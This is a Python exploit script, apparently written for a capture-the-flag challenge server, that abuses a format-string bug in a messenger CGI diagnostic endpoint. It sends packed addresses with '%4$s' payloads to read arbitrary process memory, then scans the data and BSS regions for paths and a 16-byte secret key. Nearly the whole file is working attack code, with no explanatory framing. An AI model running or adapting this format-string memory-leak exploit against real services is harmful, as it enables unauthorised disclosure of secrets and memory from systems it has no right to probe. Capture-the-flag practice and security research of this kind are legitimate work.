#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read()
    except Exception as e:
        return b""

def extract_diag_raw(raw):
    marker = b'DIAG '
    idx = raw.find(marker)
    if idx >= 0:
        return raw[idx+5:].rstrip(b'\r\n')
    return raw

def read_memory_string(addr, max_len=100):
    # Skip payload address bytes
    payload = struct.pack('<I', addr) + b"MARKER%4$s"
    resp = extract_diag_raw(send_msg_raw(payload))
    
    marker = b"MARKER"
    idx = resp.find(marker)
    if idx >= 0:
        leaked_utf8 = resp[idx+len(marker):]
        # Decode UTF-8 to get actual bytes
        try:
            return leaked_utf8.decode('utf-8').encode('latin-1')
        except:
            # Fallback if not valid utf-8 or binary
            return leaked_utf8
    return b""

print("=== Scanning for '/app/data' string in rodata/data ===")
# 0x08048000 to 0x0804a000
for addr in range(0x08048000, 0x0804a000, 32):
    s = read_memory_string(addr)
    if b"/app/" in s or b"msn" in s or b"key" in s:
        print(f"0x{addr:08x}: {repr(s)}")
    time.sleep(0.01)

print("\n=== Scanning specifically for the key buffer ===")
# If the code is: fread(key_buf, 1, 16, fp);
# We need to find key_buf.
# Let's try to find potential 16-byte random blocks in BSS.
# 0x08049000 area.
for addr in range(0x08049000, 0x0804b000, 16):
    data = read_memory_string(addr, 16)
    # Most random blocks don't start with many 0x00 or repetitive bytes.
    if len(data) >= 16 and not data.startswith(b"\x00\x00"):
        print(f"Possible key at 0x{addr:08x}: {data[:16].hex()} | {repr(data[:16])}")
    time.sleep(0.01)
